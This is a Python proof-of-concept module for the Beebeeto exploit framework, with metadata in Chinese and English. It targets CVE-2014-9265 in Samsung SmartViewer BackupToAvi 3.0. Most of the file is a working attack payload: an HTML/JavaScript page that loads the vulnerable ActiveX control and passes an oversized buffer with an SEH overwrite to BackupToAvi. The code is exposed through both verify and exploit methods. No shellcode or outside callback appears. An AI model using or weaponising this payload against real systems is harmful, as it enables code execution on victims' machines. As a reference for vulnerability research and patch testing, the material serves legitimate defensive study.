#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""


from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0015',
            'name': 'Samsung SmartViewer BackupToAvi 3.0 远程代码执行漏洞 POC',
            'author': '小马甲',
            'create_date': '2015-01-20',
        },
        # 协议相关信息
        'protocol': {
            'name': 'local',
            'port': [0],
            'layer4_protocol': [],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Samsung SmartViewer BackupToAvi',
            'vul_version': ['3.0'],
            'type': 'Code Execution',
            'tag': ['Remote Code Execution', 'Samsung SmartViewer BackupToAvi 3.0漏洞'],
            'desc': '''
                    Samsung SmartViewer BackupToAvi Remote Code Execution PoC 
                    PoC developed by Praveen Darshanam 
                     
                    For more details refer
                    http://darshanams.blogspot.com
                    http://blog.disects.com/2015/01/samsung-smartviewer-backuptoavi-remote.html
                    Original Vulnerability Discovered by rgod
                    Vulnerable: Samsung SmartViewer 3.0
                    Tested on Windows 7 Ultimate N SP1
                    http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9265
                    ''',
            'references': ['http://www.exploit-db.com/exploits/35822/',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target']
        payload = r'''
<html>
<object classid='clsid:208650B1-3CA1-4406-926D-45F2DBB9C299' id='target' ></object>
<script >
 var payload_length = 15000;
 var arg1=1;
 var arg2=1;
 var arg3=1;
 //blank strings
 var junk = "";
 var buf1 = "";
 var buf2 = "";
 
 //offset to SE is 156, initial analysis using metasploit cyclic pattern
 for (i=0; i<156; i++)
 {
  buf1 += "A";
 }
 var nseh = "DD";
 var seh = "\x87\x10";  //from Vulnerable DLL
 junk = buf1 + nseh + seh;
 
 //remaining buffer
 for (j=0; j<(payload_length-junk.length); j++)
 {
  buf2 += "B";
 }
 //final malicious buffer
 var fbuff = junk + buf2;
 target.BackupToAvi(arg1 ,arg2 ,arg3 ,fbuff);
 
</script>
</html>
        '''
        print '[+] Using: %s' % MyPoc.poc_info['vul']['desc']
        print
        print payload
        args['success'] = True
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())